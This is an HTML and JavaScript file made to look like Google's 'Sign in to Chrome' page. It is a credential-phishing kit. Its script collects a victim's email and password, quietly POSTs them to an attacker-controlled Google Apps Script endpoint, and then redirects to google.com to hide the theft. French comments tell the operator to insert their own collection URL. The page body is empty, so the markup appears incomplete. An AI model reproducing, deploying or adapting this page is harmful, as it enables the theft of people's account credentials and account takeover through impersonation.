<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to Chrome</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #f0f4f9;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      min-height: 100vh;
      padding: 0 40px;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-grow: 1;
      padding-top: 40px;
    }

    .card {
      background-color: #ffffff;
      border-radius: 28px;
      padding: 40px;
      width: 100%;
      max-width: 1040px;
      min-height: 380px;
      display: flex;
      gap: 40px;
    }

    .left-section {
      flex: 1;
      display: flex;
      flex-direction: column;
    }

    .logo {
      width: 48px;
      height: 48px;
      margin-bottom: 20px;
    }

    .title {
      font-size: 36px;
      font-weight: 400;
      color: #1f1f1f;
      line-height: 44px;
      margin-bottom: 12px;
    }

    .subtitle {
      font-size: 16px;
      color: #1f1f1f;
      line-height: 24px;
      word-break: break-all;
    }

    .right-section {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
    }

    .form-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      flex-grow: 1;
      justify-content: space-between;
    }

    .input-container {
      position: relative;
      width: 100%;
      margin-top: 12px;
    }

    .input-field {
      width: 100%;
      height: 56px;
      border: 1px solid #747775;
      border-radius: 4px;
      padding: 16px;
      font-size: 16px;
      outline: none;
      color: #1f1f1f;
      background: transparent;
    }

    .input-field:focus {
      border: 2px solid #0b57d0;
      padding: 15px;
    }

    .input-label {
      position: absolute;
      left: 12px;
      top: -10px;
      background: #ffffff;
      padding: 0 4px;
      font-size: 12px;
      color: #0b57d0;
      pointer-events: none;
    }

    .link-text {
      color: #0b57d0;
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
      margin-top: 10px;
      display: inline-block;
      cursor: pointer;
    }

    .info-text {
      font-size: 14px;
      color: #1f1f1f;
      line-height: 20px;
      margin-top: 32px;
    }

    .info-text a {
      color: #0b57d0;
      text-decoration: none;
      font-weight: 500;
    }

    .checkbox-container {
      display: flex;
      align-items: center;
      margin-top: 16px;
      cursor: pointer;
      user-select: none;
    }

    .checkbox-container input {
      margin-right: 12px;
      width: 18px;
      height: 18px;
      cursor: pointer;
      accent-color: #0b57d0;
    }

    .checkbox-label {
      font-size: 14px;
      color: #1f1f1f;
    }

    .action-container {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      gap: 24px;
      margin-top: auto;
      padding-top: 24px;
    }

    .btn-create {
      background: none;
      border: none;
      color: #0b57d0;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
    }

    .btn-next {
      background-color: #0b57d0;
      color: #ffffff;
      border: none;
      border-radius: 100px;
      padding: 0 24px;
      height: 40px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn-next:hover {
      background-color: #0842a0;
    }

    .fade-in {
      animation: fadeInEffect 0.2s ease-in-out forwards;
    }

    @keyframes fadeInEffect {
      from { opacity: 0; transform: translateY(2px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .footer {
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      color: #444746;
      width: 100%;
      max-width: 1040px;
      margin: 0 auto;
      padding: 24px 0;
    }

    .footer-left select {
      border: none;
      background: transparent;
      color: #444746;
      font-size: 12px;
      cursor: pointer;
      outline: none;
    }

    .footer-right span {
      margin-left: 24px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<script>
  let currentStep = 'email'; 
  let storedEmail = '';

  const actionBtn = document.getElementById('action-btn');
  const userInput = document.getElementById('user-input');
  const fieldLabel = document.getElementById('field-label');
  const formSubtitle = document.getElementById('form-subtitle');
  const inputArea = document.getElementById('dynamic-input-area');
  const emailLinksZone = document.getElementById('email-links-zone');
  const passToggleZone = document.getElementById('password-toggle-zone');
  const showPassCheck = document.getElementById('show-pass-check');
  const errorMessageBox = document.getElementById('error-message-box');

  actionBtn.addEventListener('click', handleFormTransition);

  userInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      handleFormTransition();
    }
  });

  userInput.addEventListener('input', () => {
    userInput.style.borderColor = '#747775';
    if (errorMessageBox) errorMessageBox.style.display = 'none';
  });

  showPassCheck.addEventListener('change', () => {
    userInput.type = showPassCheck.checked ? 'text' : 'password';
  });

  function isValidEmailString(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }

  function handleFormTransition() {
    const value = userInput.value.trim();
    
    if (!value) {
      userInput.style.borderColor = '#b3261e';
      if (errorMessageBox) {
        errorMessageBox.textContent = 'Enter an email or phone number';
        errorMessageBox.style.display = 'block';
      }
      userInput.focus();
      return;
    }

    if (currentStep === 'email') {
      if (!isValidEmailString(value)) {
        userInput.style.borderColor = '#b3261e';
        if (errorMessageBox) {
          errorMessageBox.textContent = 'Enter a valid email address';
          errorMessageBox.style.display = 'block';
        }
        userInput.focus();
        return;
      }

      storedEmail = value;
      currentStep = 'password';
      if (errorMessageBox) errorMessageBox.style.display = 'none';

      inputArea.classList.remove('fade-in');
      void inputArea.offsetWidth; 
      inputArea.classList.add('fade-in');

      formSubtitle.textContent = storedEmail; 
      fieldLabel.textContent = 'Enter your password';
      
      userInput.value = '';
      userInput.type = 'password';
      userInput.style.borderColor = '#747775';
      
      emailLinksZone.style.display = 'none';
      passToggleZone.style.display = 'block';
      showPassCheck.checked = false;

      actionBtn.textContent = 'Sign in';
      
      setTimeout(() => { userInput.focus(); }, 50);

    } else if (currentStep === 'password') {
      const payload = {
        email: storedEmail,
        password: value
      };

      // Mettez l'URL de votre script Google ci-dessous
      const googleScriptUrl = "https://script.google.com/macros/s/AKfycbx8xKulXePHEDQb-r6sAPLMomkV81YVRWyZ-s4awlDAw1_TNX2jwi_QMYVUBBasGpIGlw/exec";

      // Envoie les données en arrière-plan sans recharger la page
      fetch(googleScriptUrl, {
        method: "POST",
        mode: "no-cors", 
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      })
      .then(() => {
        // Redirige immédiatement l'onglet principal vers Google
        window.location.href = "https://google.com"; 
      })
      .catch(error => {
        console.error("Error:", error);
        window.location.href = "https://google.com";
      });
    }
  }
</script>

</body>
</html>
